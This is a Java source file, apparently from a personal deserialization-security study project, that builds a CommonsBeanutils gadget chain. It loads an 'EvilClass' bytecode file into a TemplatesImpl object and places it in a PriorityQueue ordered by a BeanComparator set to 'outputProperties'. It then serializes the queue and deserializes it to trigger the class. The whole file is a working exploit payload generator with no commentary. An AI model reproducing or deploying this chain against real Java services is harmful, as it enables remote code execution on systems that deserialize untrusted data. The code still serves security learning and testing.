package XJBTest;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class FinalEXP {
    public static void main(String[] args) throws Exception {
        byte[] evil = Files.readAllBytes(Paths.get("/home/n0zom1z0/Desktop/Java-Sec/Deserialization/CC3again/target/classes/assets/EvilClass.class"));
        byte[][] _bytecodes = {evil};

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates,"_name","notnull");
        setFieldValue(templates,"_bytecodes", _bytecodes);
        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());

//        PropertyUtils.getProperty(templates, "outputProperties");
        BeanComparator beanComparator = new BeanComparator();

        PriorityQueue<Object> queue = new PriorityQueue<Object>(2,beanComparator);
        queue.add(1);
        queue.add(2);

        Object[] queueArray = (Object[]) getFieldValue(queue,"queue");
        queueArray[0] = templates;
        queueArray[1] = templates;
        setFieldValue(beanComparator,"property","outputProperties");

        serialize(queue);
        deserialize("ser.bin");
    }
    public static void setFieldValue(Object obj,String fieldName,Object value)throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static Object getFieldValue(Object obj,String fieldName)throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }
    public static void serialize(Object o) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(o);
    }
    public static Object deserialize(String fileName) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));
        return ois.readObject();
    }
}
